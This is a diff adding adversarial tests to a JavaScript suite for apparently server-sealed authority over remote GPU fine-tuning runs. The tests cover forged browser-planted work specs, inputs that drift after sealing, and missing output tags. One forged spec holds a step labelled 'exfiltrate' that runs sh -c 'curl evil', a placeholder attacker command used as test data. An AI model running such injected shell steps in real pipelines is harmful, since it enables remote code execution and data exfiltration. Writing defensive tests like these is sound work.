@@ -20,7 +20,9 @@ const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), ".."
 const kitApp = path.join(repoRoot, "cli/assets/worker-kits/growthub-custom-workspace-starter-v1/apps/workspace");
 const lib = (rel) => pathToFileURL(path.join(kitApp, "lib", rel)).href;
 
-const { executeProviderComputeRun, cancelProviderComputeRun } = await import(lib("compute-execution.js"));
+const { executeProviderComputeRun, cancelProviderComputeRun, maybeExecuteProviderComputeForSandboxRun } = await import(lib("compute-execution.js"));
+const { COMPUTE_AUTHORITY_KEY_ENV, compileComputeAuthority, verifyComputeAuthoritySeal } = await import(lib("compute-authority.js"));
+const { hashComputeValue } = await import(lib("compute-work-spec.js"));
 const { deriveComputeLifecycle, deriveComputeArtifactHonesty } = await import(lib("compute-evidence.js"));
 const { deriveBenchmarkWins } = await import(lib("distillation-eval-harness.js"));
 const { deriveFlywheelState } = await import(lib("distillation-fleet.js"));
@@ -173,6 +175,141 @@ test("ADVERSARIAL — cancel failure: the failed cancel is recorded and capacity
   assert.equal(outcome.capacityMayStillExist, true);
   assert.equal(outcome.costMayAccrue, true);
   assert.match(outcome.reason, /capacity may still exist/i);
+});
+
+// ---------------------------------------------------------------------------
+// Server-owned authority at the route hook
+// ---------------------------------------------------------------------------
+
+const AUTH_ENV = { [COMPUTE_AUTHORITY_KEY_ENV]: "adversarial-suite-key" };
+
+function authorityRequest(overrides = {}) {
+  return {
+    schema: "growthub-compute-request-v1",
+    policy: { mode: "cloud", excludeLocal: true },
+    selectionMode: "explicit",
+    providerRegistryId: "adv-remote",
+    capacityProfileId: "single-gpu-finetune",
+    trainingProfileId: "unsloth-qlora-quantize-pipeline",
+    baseModel: "gemma3:4b",
+    datasetExportId: "export-adv-1",
+    outputModelTag: "tuned-adv-v1",
+    ...overrides,
+  };
+}
+
+function authorityConfig({ request = authorityRequest(), compute = null } = {}) {
+  return {
+    dataModel: {
+      objects: [
+        { id: "api-registry", objectType: "api-registry", rows: [providerRow()] },
+        {
+          id: "model-training-run",
+          objectType: "model-training-run",
+          rows: [{
+            trainingRunId: RUN_ID,
+            modelTrainingRowId: "workspace-local",
+            datasetExportId: "export-adv-1",
+            baseModel: "gemma3:4b",
+            trainingProfile: "unsloth-qlora-quantize-pipeline",
+            status: "running",
+            preflight: { ramGB: 16, diskFreeGB: 200, gpu: { present: false, name: "", vramFreeGB: 0 } },
+            computeRequest: JSON.stringify(request),
+            ...(compute ? { compute: JSON.stringify(compute) } : {}),
+          }],
+        },
+      ],
+    },
+  };
+}
+
+function authorityIo(adapter, workspaceConfig) {
+  return {
+    ...ioWith(adapter),
+    compileAuthority: ({ trainingRunId, request }) => compileComputeAuthority({ workspaceConfig, trainingRunId, request, now: "2026-07-20T12:00:00.000Z", env: AUTH_ENV }),
+    verifyAuthoritySeal: (authority) => verifyComputeAuthoritySeal(authority, AUTH_ENV),
+    verifyArtifact: async (artifact) => ({ verifiedSha256: artifact.sha256, verificationKind: "test-materialized" }),
+  };
+}
+
+test("ADVERSARIAL — a browser-authored, self-consistent intent/work spec on the receipt row is ignored: the server-compiled spec governs", async () => {
+  // The attacker plants a self-consistent spec (correct self-hashes, wrong
+  // content: an attacker-controlled output tag) in the caller-reachable
+  // compute column. The route hook must compile its own authority and submit
+  // THAT work spec — the planted one must have zero effect.
+  const forgedIntentBody = { schema: "growthub-compute-intent-v1", adaptivePlan: { mode: "x", tier: "x", baseModel: "gemma3:4b" }, capacityProfileId: "single-gpu-finetune", requirements: {}, requirementsHash: hashComputeValue({}), policy: { mode: "cloud" }, training: {} };
+  const forgedIntent = { ...forgedIntentBody, intentHash: hashComputeValue(forgedIntentBody) };
+  const forgedSpecBody = { schema: "growthub-training-execution-spec-v1", intentHash: forgedIntent.intentHash, requirementsHash: forgedIntent.requirementsHash, capacityProfileId: "single-gpu-finetune", trainingRunId: RUN_ID, modelTrainingRowId: "workspace-local", training: { steps: [{ stageId: "exfiltrate", label: "attacker step", bin: "sh", args: ["-c", "curl evil"] }] }, dataset: { exportId: "export-adv-1", path: "", corpusSha256: "" }, output: { modelTag: "attacker-tag", artifactPath: "/tmp/attacker", expectedKinds: [] } };
+  const forgedSpec = { ...forgedSpecBody, workSpecHash: hashComputeValue(forgedSpecBody) };
+
+  const seenWorkSpecHashes = [];
+  const adapter = adapterWith({
+    async allocate(ctx) {
+      seenWorkSpecHashes.push(ctx.workSpecHash);
+      assert.equal(ctx.workSpec?.output?.modelTag, "tuned-adv-v1", "the SERVER-compiled output identity reaches the provider");
+      return { allocationId: "alloc-authority", runRef: { ...ctx.runRef, providerResourceId: "res-authority" }, status: "allocated", idempotencyKeyHash: ctx.idempotencyKeyHash, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: { gpuType: "A100", gpuCount: 1, workers: 1, region: "" } };
+    },
+    async execute(ctx) {
+      seenWorkSpecHashes.push(ctx.workSpecHash);
+      return [{ type: "compute-queued", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "q1", detail: "" }];
+    },
+  });
+  const workspaceConfig = authorityConfig({
+    compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit", intent: forgedIntent, workSpec: forgedSpec, policy: forgedIntent.policy },
+  });
+  const outcome = await maybeExecuteProviderComputeForSandboxRun({
+    workspaceConfig,
+    objectId: "model-training-runner",
+    name: RUN_ID,
+    io: authorityIo(adapter, workspaceConfig),
+  });
+  assert.ok(outcome, "the run engages the provider lane");
+  const serverHash = outcome.computeBlock.authority?.workSpecHash;
+  assert.ok(serverHash, "server authority journaled");
+  assert.notEqual(serverHash, forgedSpec.workSpecHash);
+  for (const seen of seenWorkSpecHashes) assert.equal(seen, serverHash, "every provider boundary saw the server-compiled spec, never the planted one");
+  assert.ok(!JSON.stringify(outcome.computeBlock.workSpec).includes("attacker-tag"), "the planted spec never re-enters the journal");
+});
+
+test("ADVERSARIAL — governed inputs changed after sealing fail closed BEFORE provider submission", async () => {
+  // Seal authority over the original request, journal it, then let the
+  // customer request drift (a different output tag). The hook must refuse
+  // before allocate/execute — no paid boundary is crossed on stale authority.
+  const originalConfig = authorityConfig({});
+  const sealed = compileComputeAuthority({ workspaceConfig: originalConfig, trainingRunId: RUN_ID, now: "t", env: AUTH_ENV });
+  assert.equal(sealed.ok, true, sealed.reason);
+
+  const driftedConfig = authorityConfig({
+    request: authorityRequest({ outputModelTag: "tuned-adv-v2" }),
+    compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit", authority: sealed.authority },
+  });
+  const adapter = adapterWith({
+    async allocate() { throw new Error("allocate must never be reached on stale authority"); },
+  });
+  const outcome = await maybeExecuteProviderComputeForSandboxRun({
+    workspaceConfig: driftedConfig,
+    objectId: "model-training-runner",
+    name: RUN_ID,
+    io: authorityIo(adapter, driftedConfig),
+  });
+  assert.equal(outcome.result.ok, false);
+  assert.match(outcome.result.error, /changed after compute authority was sealed/);
+  assert.equal(outcome.result.adapterMeta.compute.authorityRefused, true);
+});
+
+test("ADVERSARIAL — authority compilation failure (missing output identity) refuses remote compute before any provider call", async () => {
+  const config = authorityConfig({ request: authorityRequest({ outputModelTag: "" }) });
+  const adapter = adapterWith({
+    async allocate() { throw new Error("allocate must never be reached without compiled authority"); },
+  });
+  const outcome = await maybeExecuteProviderComputeForSandboxRun({
+    workspaceConfig: config,
+    objectId: "model-training-runner",
+    name: RUN_ID,
+    io: authorityIo(adapter, config),
+  });
+  assert.equal(outcome.result.ok, false);
+  assert.match(outcome.result.error, /authority compilation failed \(output-identity-missing\)/);
 });
 
 test("PROMOTION BOUNDARY — compute completion can never promote: promoted is a derived evaluation verdict only", () => {
